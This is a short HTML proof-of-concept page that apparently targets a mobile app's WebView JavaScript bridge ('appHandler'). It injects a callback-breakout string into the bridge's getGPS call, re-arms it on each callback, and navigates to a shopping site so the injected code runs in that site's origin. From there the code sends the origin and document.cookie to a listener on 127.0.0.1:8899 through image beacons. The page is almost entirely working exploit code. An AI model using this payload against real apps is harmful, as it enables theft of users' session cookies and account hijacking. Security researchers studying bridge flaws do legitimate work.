<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>PROBE</title></head>
<body style="background:#111;color:#0f0;font-family:monospace;padding:16px">
<h3 style="color:#c9a96e">nav-mode probe</h3>
<div id="log"></div>
<script>
function L(s){document.getElementById('log').innerHTML+=s+'<br>'}
function beacon(t,d){new Image().src='http://127.0.0.1:8899/x?t='+t+'&d='+encodeURIComponent(d||'').substring(0,300)}
window.sep={_onSuccess:function(){},_onFailure:function(){},_onCancel:function(){}};
beacon('load',location.href);L('loaded');
if(typeof appHandler!=='undefined'){
  // 回调载体: 连环arm, 每次回调都会beacon当前origin (无论页面死活, Java侧回调照常fire)
  window.__p="0);(function(){new Image().src='http://127.0.0.1:8899/x?t=cb&d='+encodeURIComponent(location.origin+'|'+document.cookie.substring(0,400));try{appHandler.appMonitorScript('getGPS',window.__p,'{}')}catch(e){}})();//";
  appHandler.appMonitorScript('getGPS',window.__p,'{}');
  L('armed');
  setTimeout(function(){beacon('nav','');L('nav...');location.href='https://m.sephora.cn/';},2500);
}else{L('no bridge')}
</script></body></html>
